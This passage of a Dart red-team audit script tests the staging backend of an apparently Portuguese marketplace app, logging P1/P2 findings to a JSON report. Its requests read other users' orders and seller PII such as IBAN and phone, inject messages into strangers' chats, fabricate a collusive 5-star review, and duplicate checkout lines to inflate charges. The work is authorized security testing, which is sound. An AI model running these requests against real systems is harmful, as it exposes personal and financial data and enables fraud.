      'len': (r['_text'] ?? '').toString().length,
      'snippet': (r['_text'] ?? '').toString().substring(
            0,
            min(180, (r['_text'] ?? '').toString().length),
          ),
    };
  }
  evidence.add({'kind': 'privacy_scan', 'scan': scan});

  // Cross-user order by UUID
  final someone = await rest(
    'GET',
    'orders?buyer_id=neq.$buyerId&seller_id=neq.$buyerId&select=id&limit=1',
    token: svc,
  );
  if (someone['_body'] is List && (someone['_body'] as List).isNotEmpty) {
    final oid = ((someone['_body'] as List).first as Map)['id'];
    final x = await rest(
      'GET',
      'orders?id=eq.$oid&select=id,buyer_id,seller_id,price_total,shipping_address,phone',
      token: buyerJwt,
    );
    evidence.add({
      'kind': 'cross_order_uuid',
      'status': x['_status'],
      'text': (x['_text'] ?? '').toString().substring(
            0,
            min(250, (x['_text'] ?? '').toString().length),
          ),
    });
    if (x['_status'] == 200 &&
        x['_body'] is List &&
        (x['_body'] as List).isNotEmpty) {
      recFinding(
        id: 'RTB-P1-CROSS-ORDER',
        title: 'Buyer lê encomenda alheia por UUID',
        severity: 'P1',
        actor: 'buyer JWT',
        impact: 'Cross-user: dados de order de terceiros.',
        proof: {'order_id': oid, 'body': x['_body']},
      );
    }
  }

  // profiles PII of seller
  final prof = await rest(
    'GET',
    'profiles?id=eq.$sellerId&select=id,email,phone,iban,mb_way,legal_full_name,shipping_address,nif',
    token: buyerJwt,
  );
  evidence.add({
    'kind': 'profiles_cross',
    'status': prof['_status'],
    'text': (prof['_text'] ?? '').toString().substring(
          0,
          min(300, (prof['_text'] ?? '').toString().length),
        ),
  });
  final pt = (prof['_text'] ?? '').toString();
  if (prof['_status'] == 200 &&
      (pt.contains('iban') && pt.contains('PT') ||
          pt.contains('"phone":"9') ||
          pt.contains('@'))) {
    recFinding(
      id: 'RTB-P1-PROFILES-PII',
      title: 'SELECT profiles alheio devolve PII',
      severity: 'P1',
      actor: 'buyer JWT',
      impact: 'Phone/email/IBAN de outro utilizador via PostgREST.',
      proof: {'status': prof['_status']},
    );
  }

  // Storage list
  final st = await req(
    'POST',
    '$base/storage/v1/object/list/chat_media',
    token: buyerJwt,
    body: {'prefix': '', 'limit': 20},
  );
  final stBody = await readBody(st);
  evidence.add({
    'kind': 'storage_list',
    'status': st.statusCode,
    'snippet': stBody.substring(0, min(250, stBody.length)),
  });

  // chat impersonation: insert into random chat
  final chats = await rest(
    'GET',
    'chats?select=id,user_a,user_b&limit=20',
    token: svc,
  );
  if (chats['_body'] is List) {
    for (final c in chats['_body'] as List) {
      final m = c as Map;
      final a = m['user_a']?.toString();
      final b = m['user_b']?.toString();
      if (a != buyerId && b != buyerId) {
        final ins = await rest('POST', 'chat_messages', token: buyerJwt, body: {
          'chat_id': m['id'],
          'sender_id': buyerId,
          'receiver_id': a,
          'text': 'rtb-blind-b',
          'is_read': false,
        });
        evidence.add({
          'kind': 'chat_inject_foreign',
          'status': ins['_status'],
          'text': (ins['_text'] ?? '').toString().substring(
                0,
                min(180, (ins['_text'] ?? '').toString().length),
              ),
        });
        if (ins['_status'] == 201 || ins['_status'] == 200) {
          recFinding(
            id: 'RTB-P1-CHAT-INJECT',
            title: 'Buyer injeta mensagem em chat de terceiros',
            severity: 'P1',
            actor: 'buyer JWT',
            impact: 'Cross-user: escrita em conversa alheia.',
            proof: {'chat_id': m['id'], 'status': ins['_status']},
          );
        }
        break;
      }
    }
  }
}

Future<void> cycleCollusion() async {
  // MB WAY pago → enviado → concluido → review (reputação sem captura)
  final tag = stamp();
  final p = await rest('POST', 'products', token: sellerJwt, body: {
    'seller_id': sellerId,
    'title': 'RTB review $tag',
    'price': 6.0,
    'quantity': 2,
    'ref_code': 'RTB-RV-$tag',
    'list_on_marketplace': true,
    'is_sold': false,
  });
  String? pid;
  if (p['_body'] is List && (p['_body'] as List).isNotEmpty) {
    pid = ((p['_body'] as List).first as Map)['id']?.toString();
  }
  if (pid == null) return;
  final o = await rest('POST', 'orders', token: buyerJwt, body: {
    'buyer_id': buyerId,
    'seller_id': sellerId,
    'product_id': pid,
    'status': 'reserva_pendente',
    'payment_method': 'MB WAY',
    'price_total': 6,
    'quantity': 1,
  });
  String? oid;
  if (o['_body'] is List && (o['_body'] as List).isNotEmpty) {
    oid = ((o['_body'] as List).first as Map)['id']?.toString();
  }
  if (oid == null) return;
  await rest('PATCH', 'orders?id=eq.$oid', token: sellerJwt, body: {
    'status': 'pago',
  });
  await rest('PATCH', 'orders?id=eq.$oid', token: sellerJwt, body: {
    'status': 'enviado',
  });
  final conc = await rest('PATCH', 'orders?id=eq.$oid', token: buyerJwt, body: {
    'status': 'concluido',
  });
  final rev = await rest('POST', 'reviews', token: buyerJwt, body: {
    'order_id': oid,
    'target_id': sellerId,
    'buyer_id': buyerId,
    'stars': 5,
    'comment': 'rtb collusion',
    'author_role': 'comprador',
    'target_type': 'seller',
  });
  final oFin = await rest(
    'GET',
    'orders?id=eq.$oid&select=id,status,amount_paid_cents,stock_units_applied,wallet_release_processed_at',
    token: svc,
  );
  evidence.add({
    'kind': 'collusion_review',
    'concluido': conc['_status'],
    'review': {
      'status': rev['_status'],
      'text': (rev['_text'] ?? '').toString().substring(
            0,
            min(250, (rev['_text'] ?? '').toString().length),
          ),
    },
    'order': oFin['_body'],
  });
  if (rev['_status'] == 201 || rev['_status'] == 200) {
    recFinding(
      id: 'RTB-P2-REVIEW-OFFPLATFORM',
      title: 'Review 5★ após MB WAY collusion (sem captura Stripe)',
      severity: 'P2',
      actor: 'buyer+seller collusion',
      impact:
          'Reputação fabricada: stock consome-se, review entra, wallet não (amount_paid=0).',
      proof: {'review_status': rev['_status'], 'order': oFin['_body']},
    );
  }

  // payment_method allowlist bypass attempt
  final oPlat = await rest('POST', 'orders', token: buyerJwt, body: {
    'buyer_id': buyerId,
    'seller_id': sellerId,
    'product_id': pid,
    'status': 'reserva_pendente',
    'payment_method': 'Pagamento na App (MB WAY/Transf)',
    'price_total': 6,
    'quantity': 1,
  });
  String? oidP;
  if (oPlat['_body'] is List && (oPlat['_body'] as List).isNotEmpty) {
    oidP = ((oPlat['_body'] as List).first as Map)['id']?.toString();
  }
  Map<String, dynamic>? platPago;
  if (oidP != null) {
    platPago = await rest('PATCH', 'orders?id=eq.$oidP', token: sellerJwt, body: {
      'status': 'pago',
    });
  }
  evidence.add({
    'kind': 'platform_string_pago',
    'insert': oPlat['_status'],
    'patch': platPago?['_status'],
    'text': (platPago?['_text'] ?? '').toString().substring(
          0,
          min(220, (platPago?['_text'] ?? '').toString().length),
        ),
  });
}

Future<void> cycleSaturation() async {
  // Duplicate bag checkout quote
  final tag = stamp();
  final p = await rest('POST', 'products', token: sellerJwt, body: {
    'seller_id': sellerId,
    'title': 'RTB bag $tag',
    'price': 7.0,
    'quantity': 3,
    'ref_code': 'RTB-BAG-$tag',
    'list_on_marketplace': true,
    'is_sold': false,
  });
  String? pid;
  if (p['_body'] is List && (p['_body'] as List).isNotEmpty) {
    pid = ((p['_body'] as List).first as Map)['id']?.toString();
  }
  if (pid == null) return;
  final o = await rest('POST', 'orders', token: buyerJwt, body: {
    'buyer_id': buyerId,
    'seller_id': sellerId,
    'product_id': pid,
    'status': 'reserva_pendente',
    'payment_method': 'Pagamento na App',
    'price_total': 7,
    'quantity': 1,
  });
  String? oid;
  if (o['_body'] is List && (o['_body'] as List).isNotEmpty) {
    oid = ((o['_body'] as List).first as Map)['id']?.toString();
  }
  if (oid == null) return;
  final bag = await edge('create-payment-intent', token: buyerJwt, body: {
    'buyer_id': buyerId,
    'order_id': oid,
    'bag_checkout': true,
    'shipping_method': 'mao',
    'bag_lines': [
      {'order_id': oid},
      {'order_id': oid},
    ],
  });
  evidence.add({
    'kind': 'bag_duplicate_line',
    'status': bag['_status'],
    'text': (bag['_text'] ?? '').toString().substring(
          0,
          min(300, (bag['_text'] ?? '').toString().length),
        ),
    'server_amount': (bag['_body'] is Map)
        ? (bag['_body'] as Map)['server_amount_cents']
        : null,
  });
  if (bag['_status'] == 200 && bag['_body'] is Map) {
    final amt = (bag['_body'] as Map)['server_amount_cents'];
    // 7€ * 2 + protection. If duplicated, amount ~ 2x items.
    if (amt is num && amt > 1400) {
      recFinding(
        id: 'RTB-P2-BAG-DUP-LINE',
        title: 'Bag checkout aceita a mesma order duas vezes (overcharge)',
        severity: 'P2',
        actor: 'buyer JWT',
        impact:
            'Cliente pode ser cobrado 2× pela mesma linha; settle pode pagar só uma.',
        proof: {'server_amount_cents': amt, 'order_id': oid},
      );
    }
  }

  // Converted reservation as buyer
  final lives = await rest(
    'GET',
    'lives?seller_id=eq.$sellerId&select=id&limit=1',
    token: sellerJwt,
  );
  String? liveId;
  if (lives['_body'] is List && (lives['_body'] as List).isNotEmpty) {
    liveId = ((lives['_body'] as List).first as Map)['id']?.toString();
  }
  if (liveId != null) {
    final items = await rest(
      'GET',
      'live_items?live_id=eq.$liveId&select=id&limit=1',
      token: sellerJwt,
    );
    if (items['_body'] is List && (items['_body'] as List).isNotEmpty) {
      final li = ((items['_body'] as List).first as Map)['id'];
      final conv = await rest(
        'POST',
        'live_reservation_requests',
        token: buyerJwt,
        body: {
          'live_id': liveId,
          'live_item_id': li,
          'seller_id': sellerId,
          'buyer_id': buyerId,
          'requested_qty': 1,
          'status': 'converted',
          'source': 'fleaber_live',
        },
      );
      evidence.add({
        'kind': 'buyer_insert_converted',
        'status': conv['_status'],
        'text': (conv['_text'] ?? '').toString().substring(
              0,
              min(220, (conv['_text'] ?? '').toString().length),
            ),
      });
    }
  }

  // Tip amount mutation / self-tip
  final selfTip = await edge('create-live-tip-checkout', token: buyerJwt, body: {
    'seller_id': buyerId,
    'amount_eur': 1,
    'live_id': liveId,
  });
  evidence.add({
    'kind': 'self_tip',
    'status': selfTip['_status'],
    'text': (selfTip['_text'] ?? '').toString().substring(
          0,
          min(220, (selfTip['_text'] ?? '').toString().length),
        ),
  });
}

Future<void> writeDeliverables() async {
  final p0 = findings.where((f) => f['severity'] == 'P0').length;
  final p1 = findings.where((f) => f['severity'] == 'P1').length;
  final p2 = findings.where((f) => f['severity'] == 'P2').length;
  final lastCycleNew = cycles.isNotEmpty &&
      findings.any((f) => (f['id'] as String).contains('SAT'));

  final verdict = p0 > 0
      ? 'FAIL_P0'
      : p1 > 0
          ? 'FAIL_P1'
          : 'PASS_CEGO_SATURADO';

  final out = {
    'auditor': 'REDTEAM_BLIND_B',
    'frozen_at': frozenAt,
    'staging': stagingRef,
    'production_touched': false,
    'fase4': false,
    'p0': p0,
    'p1': p1,
    'p2': p2,
    'findings': findings,
    'cycles': cycles,
    'map': mapNotes,
    'verdict': verdict,
    'last_cycle_new_p0_p1_class': lastCycleNew,
  };

  final jsonPath = 'REDTEAM_BLIND_B_20260829_1012.json';
  await File(jsonPath).writeAsString(
    const JsonEncoder.withIndent('  ').convert({
      ...out,
      'evidence': evidence,
    }),
  );
  stdout.writeln('JSON $jsonPath p0=$p0 p1=$p1 p2=$p2 verdict=$verdict');
}
